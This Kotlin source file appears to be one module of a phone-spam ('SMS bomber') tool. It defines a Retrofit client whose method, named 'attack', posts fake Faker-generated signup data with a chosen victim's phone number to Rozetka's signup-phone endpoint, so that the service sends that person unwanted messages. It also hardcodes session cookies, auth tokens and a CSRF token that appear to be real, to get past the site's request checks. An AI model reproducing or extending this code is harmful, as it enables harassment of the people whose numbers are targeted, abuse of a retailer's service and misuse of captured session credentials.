package com.main.services.some.list

import com.github.javafaker.Faker
import com.google.gson.annotations.SerializedName
import com.main.services.some.core.BaseService
import com.main.services.some.generation.generateEmail
import okhttp3.ResponseBody
import retrofit2.Call
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.http.Body
import retrofit2.http.Header
import retrofit2.http.POST

interface RozetkaService : BaseService {

    @POST("session/auth/signup-phone")
    fun attack(
        @Header("Cookie") cookie: String = "ab-cart-se=new; xab_segment=123; slang=ru; uid=rB4eDGHMb00wHeQls7l4Ag==; visitor_city=1; _uss-csrf=zfILVt2Lk9ea1KoFpg6LVnxCivNV1mff+ZDbpC0kSK9c/K/5; ussat_exp=1640830991; ussat=8201437cececef15030d16966efa914d.ua-a559ca63edf16a11f148038356f6ac94.1640830991; ussrt=6527028eb43574da97a51f66ef50c5d0.ua-a559ca63edf16a11f148038356f6ac94.1643379791; ussapp=u3-u_ZIf2pBPN8Y6oGYIQZLBN4LUkQgplA_Dy2IX; uss_evoid_cascade=no",
        @Header("Csrf-Token") token: String = "zfILVt2Lk9ea1KoFpg6LVnxCivNV1mff+ZDbpC0kSK9c/K/5",
        @Body rozetkaData: RozetkaData
    ): Call<ResponseBody>

    companion object {
        data class RozetkaData(
            @SerializedName("title") val title: String = Faker.instance().name().title(),
            @SerializedName("first_name") val firstName: String = Faker.instance().name().firstName(),
            @SerializedName("last_name") val lastName: String = Faker.instance().name().lastName(),
            @SerializedName("password") val password: String = Faker.instance().name().username(),
            @SerializedName("email") val email: String = Faker.instance().generateEmail(),
            @SerializedName("phone") val phone: String,
            @SerializedName("request_token") val requestToken: String = "rB4eDGHMb00wHeQls7l4Ag==",
        )
        fun build(): RozetkaService {
            return Retrofit.Builder()
                .baseUrl("https://uss.rozetka.com.ua/")
                .addConverterFactory(GsonConverterFactory.create())
                .build()
                .create(RozetkaService::class.java)
        }
    }
}